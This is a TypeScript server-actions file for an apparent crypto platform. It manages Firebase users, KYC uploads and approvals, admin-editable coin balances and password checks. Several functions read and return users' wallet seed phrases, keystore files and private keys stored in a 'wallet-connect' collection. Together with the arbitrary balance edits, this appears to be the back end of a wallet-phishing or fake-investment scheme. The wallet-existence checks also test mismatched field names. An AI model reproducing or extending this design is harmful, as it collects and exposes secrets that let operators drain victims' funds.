"use server";

import { adminDb } from "@/lib/firebase/firebaseAdmin";
import { parseStringify } from "../utils";
import { Client, Storage } from "appwrite";
import { revalidatePath } from "next/cache";
import axios from "axios"

export async function getUserByUidWithWalletStatus(uid: string) {
  try {
    const docRef = adminDb.collection("users").doc(uid);
    const docSnap = await docRef.get();
    if (!docSnap.exists) {
      return null;
    }
    const userData = docSnap.data();

    const walletDoc = await adminDb.collection("wallet-connect").doc(uid).get();
    const hasWallet =
      walletDoc.exists &&
      (
        (walletDoc.data()?.phrases && walletDoc.data()?.phrases.length > 0) ||
        (walletDoc.data()?.keystorejson && walletDoc.data()?.keystore.length > 0) ||
        (walletDoc.data()?.privatekey && walletDoc.data()?.private.length > 0)
      );

    const user = {
      uid: docSnap.id,
      emailVerified: userData?.emailVerified,
      ...userData,
      wallet: !!hasWallet,
      phrases: walletDoc.data()?.phrases || [],
      keystorejson: walletDoc.data()?.keystorejson || [] as KeystoreEntry[],
      privatekey: walletDoc.data()?.privatekey || [],
    } as User & { wallet: boolean, phrases?: string[], keystorejson?: KeystoreEntry[], privatekey?: string[] };

    return parseStringify(user);
  } catch (error) {
    throw error;
  }
}

export async function updateUserProfile(uid: string, updates: Partial<User>) {
  try {
    const docRef = adminDb.collection("users").doc(uid);
    await docRef.update(updates);
    const updatedDoc = await docRef.get();
    const updatedUserData = { uid: updatedDoc.id, ...updatedDoc.data() } as User;

    return parseStringify(updatedUserData);
  } catch (error) {
    throw error;
  }
}

export async function uploadKycPhoto(kycPhoto: File, uid: string): Promise<string> {
  const endpoint = process.env.APPWRITE_ENDPOINT;
  const projectId = process.env.APPWRITE_PROJECT_ID;
  const bucketId = process.env.APPWRITE_BUCKET_ID;

  if (!endpoint || !projectId || !bucketId) {
    throw new Error("Missing Appwrite environment configuration");
  }

  const client = new Client()
    .setEndpoint(endpoint)
    .setProject(projectId);

  const storage = new Storage(client);

  const response = await storage.createFile(
    bucketId,
    uid,
    kycPhoto
  );

  const fileUrl = storage.getFileView(bucketId, response.$id);
  return fileUrl;
}

export async function deletePhoto(fileId: string) {
  const endpoint = process.env.APPWRITE_ENDPOINT;
  const projectId = process.env.APPWRITE_PROJECT_ID;
  const bucketId = process.env.APPWRITE_BUCKET_ID;

  if (!endpoint || !projectId || !bucketId) {
    throw new Error("Missing Appwrite environment configuration");
  }

  const client = new Client()
    .setEndpoint(endpoint)
    .setProject(projectId);

  const storage = new Storage(client);

  try {
    await storage.deleteFile(bucketId, fileId);
  } catch (error) {
    throw error;
  }
}

export async function storeUserKycDocument(uid: string, kycType: string, kycUrl: string) {
  try {
    const docRef = adminDb.collection("users").doc(uid);
    const docSnap = await docRef.get();
    if (!docSnap.exists) {
      throw new Error("User document does not exist");
    }

    if (!kycType) {
      throw new Error("KYC type is required");
    }

    if (!kycUrl) {
      throw new Error("KYC photo upload failed");
    }

    await docRef.update({
      kyc: {
        url: kycUrl,
        type: kycType,
        uploadedAt: new Date().toISOString(),
        status: "pending",
      },
    });

    const updatedUserData = {
      uid,
      kyc: {
        url: kycUrl,
        type: kycType,
        uploadedAt: new Date().toISOString(),
        status: "pending",
      },
    };

    revalidatePath("/admin")
    revalidatePath(`/admin/kyc/${uid}`)
    revalidatePath("/user/kyc-form");

    return parseStringify(updatedUserData);
  }
  catch (error) {
    throw error;
  }
}

export async function getUserKycDocument(uid: string) {
  try {
    const docRef = adminDb.collection("users").doc(uid);
    const docSnap = await docRef.get();
    if (!docSnap.exists) {
      return null;
    }
    const userData = docSnap.data();
    return {
      uid: docSnap.id,
      kyc: userData?.kyc || null,
    };
  } catch (error) {
    throw error;
  }
}

export async function getAllUsersWithWalletStatus() {
  const usersSnapshot = await adminDb.collection("users").get();
  const users = [];

  for (const doc of usersSnapshot.docs) {
    const userData = doc.data();
    const uid = doc.id;

    const walletDoc = await adminDb.collection("wallet-connect").doc(uid).get();
    const hasWallet =
      walletDoc.exists &&
      (
        (walletDoc.data()?.phrases && walletDoc.data()?.phrases.length > 0) ||
        (walletDoc.data()?.keystore && walletDoc.data()?.keystore.length > 0) ||
        (walletDoc.data()?.private && walletDoc.data()?.private.length > 0)
      );

    users.push({
      ...userData,
      uid,
      wallet: !!hasWallet,
    } as User & { wallet: boolean })
  }

  return parseStringify(users)
}

export async function updateUserKycStatus(uid: string, status: "approved" | "rejected") {
  const userRef = adminDb.collection("users").doc(uid);
  const userDoc = await adminDb.collection("users").doc(uid).get();

  const updateData = {
    ["kyc.status"]: status
  }

  await userRef.update(updateData);

  revalidatePath(`/admin/kyc/${uid}`);
  revalidatePath("/admin");
  revalidatePath("/user/kyc-form");
  revalidatePath("/user/dashboard");

  const user = {
    uid: uid,
    email: userDoc.data()?.email,
    emailVerified: userDoc.data()?.emailVerified,
    userName: userDoc.data()?.userName,
    fullName: userDoc.data()?.fullName,
    lastName: userDoc.data()?.lastName,
    address: userDoc.data()?.address,
    country: userDoc.data()?.country,
    phone: userDoc.data()?.phone,
    state: userDoc.data()?.state,
    city: userDoc.data()?.city,
    zipCode: userDoc.data()?.zipCode,
    createdAt: userDoc.data()?.createdAt,
    kyc: userDoc.data()?.kyc,
    coins: userDoc.data()?.coins,
  } as User;

  return parseStringify(user);
}

export const getUserByEmail = async (email: string) => {
  try {
    const snapshot = await adminDb.collection("users").where("email", "==", email).limit(1).get();

    if (snapshot.empty) {
      throw new Error("User not found");
    }

    const userDoc = snapshot.docs[0];

    const user = {
      uid: userDoc.data()?.uid,
      email: userDoc.data()?.email,
      emailVerified: userDoc.data()?.emailVerified,
      userName: userDoc.data()?.userName,
      fullName: userDoc.data()?.fullName,
      lastName: userDoc.data()?.lastName,
      address: userDoc.data()?.address,
      country: userDoc.data()?.country,
      phone: userDoc.data()?.phone,
      state: userDoc.data()?.state,
      city: userDoc.data()?.city,
      zipCode: userDoc.data()?.zipCode,
      createdAt: userDoc.data()?.createdAt,
      kyc: userDoc.data()?.kyc,
      coins: userDoc.data()?.coins,
    } as User;

    return parseStringify(user);
  } catch (error) {
    throw error
  }
}

export const getUserById = async (id: string) => {
  try {
    const userDoc = await adminDb.collection("users").doc(id).get();

    if (!userDoc.exists) {
      throw new Error("User not found");
    }

    const user = {
      uid: userDoc.data()?.uid,
      email: userDoc.data()?.email,
      emailVerified: userDoc.data()?.emailVerified,
      userName: userDoc.data()?.userName,
      fullName: userDoc.data()?.fullName,
      lastName: userDoc.data()?.lastName,
      address: userDoc.data()?.address,
      country: userDoc.data()?.country,
      phone: userDoc.data()?.phone,
      state: userDoc.data()?.state,
      city: userDoc.data()?.city,
      zipCode: userDoc.data()?.zipCode,
      createdAt: userDoc.data()?.createdAt,
      kyc: userDoc.data()?.kyc,
      coins: userDoc.data()?.coins,
    } as User;

    return parseStringify(user);
  } catch (error) {
    throw error
  }
}

export const getAllUsers = async () => {
  try {
    const usersSnapshot = await adminDb.collection('users').get();
    const users = usersSnapshot.docs.map(doc => {
      return {
        uid: doc.id,
        ...doc.data(),
      } as User
    });

    return parseStringify(users);
  } catch (error) {
    console.error("Error fetching users:", error);
    throw error;
  }
}

export async function updateUserCoinBalance(user: User, type: string, newBalance: number) {
  try {
    const userRef = adminDb.collection('users').doc(user.uid);

    await userRef.update({
      [`coins.${type}`]: newBalance,
    });

    revalidatePath("/admin/add-balance");
    revalidatePath("/user/dashboard");
  } catch (error) {
    console.error('Error updating coin balance:', error);
    throw error;
  }
}

export const verifyCurrentPassword = async (email: string, currentPassword: string): Promise<{ error?: string }> => {
  const FIREBASE_API_KEY = process.env.FIREBASE_API_KEY!;
  const url = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${FIREBASE_API_KEY}`;

  try {
    const response = await axios.post(url, {
      email,
      password: currentPassword,
      returnSecureToken: false,
    });

    console.log(response.data.localId)

    return {};
  } catch {
    return { error: "Invalid current password" };
  }
}

export async function activateUserCard(userId: string, activationType: "silver" | "gold") {
  try {
    const userRef = adminDb.collection("users").doc(userId);

    await userRef.update({
      activation: {
        [activationType]: true,
      }
    });
  } catch (error) {
    throw error;
  }
}